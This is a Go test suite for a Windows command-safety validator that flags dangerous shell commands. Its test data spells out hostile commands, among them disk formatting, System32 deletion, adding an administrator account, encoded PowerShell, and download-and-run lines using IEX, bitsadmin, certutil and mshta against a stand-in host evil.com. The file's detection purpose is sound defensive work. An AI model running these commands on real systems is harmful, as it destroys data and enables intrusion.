package security

import (
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite 安全检查测试套件
type SecurityTestSuite struct {
	suite.Suite
}

// SetupTest 每个测试前的设置
func (suite *SecurityTestSuite) SetupTest() {
	// 测试前的准备工作，如果需要的话
}

// TestIsDangerousCommand_DangerousCommands 测试危险命令检测
func (suite *SecurityTestSuite) TestIsDangerousCommand_DangerousCommands() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// 系统破坏命令 (Windows)
		{
			name:     "format C drive",
			command:  "format C:",
			expected: true,
		},
		{
			name:     "format with path",
			command:  "format D: /q",
			expected: true,
		},
		{
			name:     "del system32",
			command:  "del /s /q C:\\Windows\\System32",
			expected: true,
		},
		{
			name:     "del with slash",
			command:  "del /s /q C:\\Windows",
			expected: true,
		},
		{
			name:     "rd remove directory",
			command:  "rd /s /q C:\\Windows",
			expected: true,
		},
		{
			name:     "diskpart",
			command:  "diskpart",
			expected: true,
		},

		// 系统控制命令 (Windows)
		{
			name:     "shutdown",
			command:  "shutdown -s -t 0",
			expected: true,
		},
		{
			name:     "shutdown immediate",
			command:  "shutdown /s /t 0",
			expected: true,
		},
		{
			name:     "restart",
			command:  "shutdown -r -t 0",
			expected: true,
		},
		{
			name:     "logoff",
			command:  "logoff",
			expected: true,
		},
		{
			name:     "taskkill force",
			command:  "taskkill /f /im svchost.exe",
			expected: true,
		},
		{
			name:     "Stop-Computer",
			command:  "Stop-Computer -Force",
			expected: true,
		},
		{
			name:     "Restart-Computer",
			command:  "Restart-Computer -Force",
			expected: true,
		},

		// 权限提升命令
		{
			name:     "takeown",
			command:  "takeown /f C:\\Windows",
			expected: true,
		},
		{
			name:     "icacls everyone",
			command:  "icacls C:\\Windows /grant Everyone:F",
			expected: true,
		},
		{
			name:     "cacls everyone",
			command:  "cacls C:\\Windows /grant Everyone:F",
			expected: true,
		},
		{
			name:     "net user add",
			command:  "net user hacker password /add",
			expected: true,
		},
		{
			name:     "net localgroup administrators",
			command:  "net localgroup administrators hacker /add",
			expected: true,
		},

		// 网络攻击命令
		{
			name:     "net view",
			command:  "net view",
			expected: true,
		},
		{
			name:     "net use",
			command:  "net use \\\\target\\share",
			expected: true,
		},
		{
			name:     "net session",
			command:  "net session",
			expected: true,
		},

		// 磁盘操作危险命令
		{
			name:     "copy con",
			command:  "copy con C:\\autoexec.bat",
			expected: true,
		},

		// 系统关键文件修改
		{
			name:     "echo to windows",
			command:  "echo malicious > C:\\Windows\\test.txt",
			expected: true,
		},
		{
			name:     "echo to system32",
			command:  "echo malicious > C:\\System32\\test.txt",
			expected: true,
		},

		// 后门和恶意软件
		{
			name:     "powershell encoded",
			command:  "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A",
			expected: true,
		},
		{
			name:     "powershell encodedcommand",
			command:  "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0A",
			expected: true,
		},
		{
			name:     "Invoke-Expression download",
			command:  "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')",
			expected: true,
		},
		{
			name:     "IEX download",
			command:  "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
			expected: true,
		},
		{
			name:     "DownloadString",
			command:  "(New-Object Net.WebClient).DownloadString('http://evil.com')",
			expected: true,
		},
		{
			name:     "DownloadFile",
			command:  "(New-Object Net.WebClient).DownloadFile('http://evil.com', 'file.exe')",
			expected: true,
		},
		{
			name:     "bitsadmin",
			command:  "bitsadmin /transfer job http://evil.com/file.exe C:\\file.exe",
			expected: true,
		},
		{
			name:     "certutil urlcache",
			command:  "certutil -urlcache -split -f http://evil.com/file.exe",
			expected: true,
		},
		{
			name:     "mshta http",
			command:  "mshta http://evil.com/payload.hta",
			expected: true,
		},

		// 包管理器
		{
			name:     "choco install",
			command:  "choco install malicious-package",
			expected: true,
		},
		{
			name:     "scoop install",
			command:  "scoop install malware",
			expected: true,
		},
		{
			name:     "winget install",
			command:  "winget install evil-package",
			expected: true,
		},
		{
			name:     "pip install",
			command:  "pip install malicious",
			expected: true,
		},
		{
			name:     "npm install global",
			command:  "npm install -g backdoor",
			expected: true,
		},

		// 环境变量注入
		{
			name:     "setx path",
			command:  "setx PATH malicious",
			expected: true,
		},
		{
			name:     "set path",
			command:  "set PATH=malicious:$PATH",
			expected: true,
		},

		// 注册表危险操作
		{
			name:     "reg delete",
			command:  "reg delete HKLM\\Software\\Important",
			expected: true,
		},
		{
			name:     "reg add HKLM",
			command:  "reg add HKLM\\Software\\Malware",
			expected: true,
		},
		{
			name:     "Remove-Item HKLM",
			command:  "Remove-Item HKLM:\\Software\\Important",
			expected: true,
		},

		// Fork bomb
		{
			name:     "fork bomb",
			command:  "%0|%0",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsDangerousCommand_SafeCommands 测试安全命令
func (suite *SecurityTestSuite) TestIsDangerousCommand_SafeCommands() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// 基本安全命令
		{
			name:     "dir",
			command:  "dir",
			expected: false,
		},
		{
			name:     "dir list",
			command:  "dir C:\\Users",
			expected: false,
		},
		{
			name:     "echo",
			command:  "echo hello world",
			expected: false,
		},
		{
			name:     "type",
			command:  "type file.txt",
			expected: false,
		},
		{
			name:     "whoami",
			command:  "whoami",
			expected: false,
		},
		{
			name:     "hostname",
			command:  "hostname",
			expected: false,
		},
		{
			name:     "date",
			command:  "date",
			expected: false,
		},
		{
			name:     "time",
			command:  "time",
			expected: false,
		},

		// 安全的管道操作
		{
			name:     "findstr pipe findstr",
			command:  "dir | findstr 'test'",
			expected: false,
		},
		{
			name:     "findstr pipe more",
			command:  "dir | findstr 'test' | more",
			expected: false,
		},
		{
			name:     "where pipe xargs",
			command:  "where *.exe | xargs echo",
			expected: false,
		},

		// 安全的重定向操作
		{
			name:     "redirect to temp",
			command:  "echo test > C:\\Temp\\test.txt",
			expected: false,
		},
		{
			name:     "redirect to current dir",
			command:  "echo test > output.txt",
			expected: false,
		},
		{
			name:     "redirect to log file",
			command:  "echo log entry > app.log",
			expected: false,
		},
		{
			name:     "redirect to txt file",
			command:  "echo data > results.txt",
			expected: false,
		},
		{
			name:     "redirect to out file",
			command:  "echo output > program.out",
			expected: false,
		},
		{
			name:     "append to log",
			command:  "echo entry >> app.log",
			expected: false,
		},
		{
			name:     "go build",
			command:  "go build -o app.exe main.go",
			expected: false,
		},
		{
			name:     "go test",
			command:  "go test ./...",
			expected: false,
		},
		{
			name:     "git status",
			command:  "git status",
			expected: false,
		},
		{
			name:     "npm run test",
			command:  "npm run test",
			expected: false,
		},
		{
			name:     "python script",
			command:  "python script.py",
			expected: false,
		},
		{
			name:     "pwsh command",
			command:  "pwsh -Command Get-Process",
			expected: false,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsDangerousCommand_EdgeCases 测试边界情况
func (suite *SecurityTestSuite) TestIsDangerousCommand_EdgeCases() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "empty command",
			command:  "",
			expected: false,
		},
		{
			name:     "whitespace only",
			command:  "   \t\n  ",
			expected: false,
		},
		{
			name:     "very long safe command",
			command:  "echo This is a very long safe command that should not be flagged as dangerous",
			expected: false,
		},
		{
			name:     "quoted dangerous command (single quotes)",
			command:  "echo 'shutdown -s'",
			expected: false, // 引号内的命令应该被认为是安全的
		},
		{
			name:     "quoted dangerous command (double quotes)",
			command:  `echo "format C:"`,
			expected: false, // 引号内的命令应该被认为是安全的
		},
		{
			name:     "mixed quotes",
			command:  `echo 'This contains "del" inside quotes'`,
			expected: false,
		},
		{
			name:     "case insensitive dangerous command",
			command:  "SHUTDOWN -s -t 0",
			expected: true,
		},
		{
			name:     "mixed case dangerous command",
			command:  "ShUtDoWn -s -t 0",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsInQuotes 测试引号检查函数
func (suite *SecurityTestSuite) TestIsInQuotes() {
	tests := []struct {
		name     string
		command  string
		pos      int
		expected bool
	}{
		{
			name:     "in single quotes",
			command:  "echo 'hello world'",
			pos:      7,
			expected: true,
		},
		{
			name:     "in double quotes",
			command:  `echo "hello world"`,
			pos:      7,
			expected: true,
		},
		{
			name:     "outside quotes",
			command:  "echo hello world",
			pos:      7,
			expected: false,
		},
		{
			name:     "after closing quote",
			command:  "echo 'hello' world",
			pos:      15,
			expected: false,
		},
		{
			name:     "odd single quotes",
			command:  "echo 'hello world",
			pos:      7,
			expected: true,
		},
		{
			name:     "odd double quotes",
			command:  `echo "hello world`,
			pos:      7,
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isInQuotes(tt.command, tt.pos)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s, Pos: %d", tt.command, tt.pos)
		})
	}
}

// TestIsSafePipeUsage 测试安全管道使用检查
func (suite *SecurityTestSuite) TestIsSafePipeUsage() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "findstr findstr",
			command:  "dir | findstr test | findstr file",
			expected: true,
		},
		{
			name:     "findstr more",
			command:  "dir | findstr test | more",
			expected: true,
		},
		{
			name:     "where xargs",
			command:  "where *.exe | xargs echo",
			expected: true,
		},
		{
			name:     "unsafe pipe",
			command:  "curl http://evil.com | powershell -Command -",
			expected: false,
		},
		{
			name:     "case insensitive safe pipe",
			command:  "DIR | FINDSTR TEST | MORE",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isSafePipeUsage(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsSafeRedirectUsage 测试安全重定向使用检查
func (suite *SecurityTestSuite) TestIsSafeRedirectUsage() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "redirect to temp",
			command:  "echo test > C:\\Temp\\test.txt",
			expected: true,
		},
		{
			name:     "redirect to current dir",
			command:  "echo test > output.txt",
			expected: true,
		},
		{
			name:     "redirect to log file",
			command:  "echo log entry > app.log",
			expected: true,
		},
		{
			name:     "redirect to txt file",
			command:  "echo data > results.txt",
			expected: true,
		},
		{
			name:     "redirect to out file",
			command:  "echo output > program.out",
			expected: true,
		},
		{
			name:     "unsafe redirect to system",
			command:  "echo test > C:\\Windows\\test.txt",
			expected: true,
		},
		{
			name:     "case insensitive safe redirect",
			command:  "ECHO TEST > C:\\TEMP\\TEST.TXT",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isSafeRedirectUsage(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestSecurityValidator_Parallel 并发安全测试
func (suite *SecurityTestSuite) TestSecurityValidator_Parallel() {
	// 简单的并发测试，验证函数没有竞态条件
	command := "dir"

	// 使用WaitGroup来等待所有并发测试完成
	var wg sync.WaitGroup
	const numGoroutines = 10
	const numIterations = 100

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < numIterations; j++ {
				result := IsDangerousCommand(command)
				assert.False(suite.T(), result, "Command should be safe: %s", command)
			}
		}()
	}

	wg.Wait()
}

// 运行测试套件
func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}

// 基准测试
func BenchmarkIsDangerousCommand_Safe(b *testing.B) {
	command := "dir C:\\Users\\test\\documents"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}

func BenchmarkIsDangerousCommand_Dangerous(b *testing.B) {
	command := "del /s /q C:\\Important\\data"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}

func BenchmarkIsDangerousCommand_Complex(b *testing.B) {
	command := "dir C:\\Temp | findstr .log | findstr error > results.txt"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}
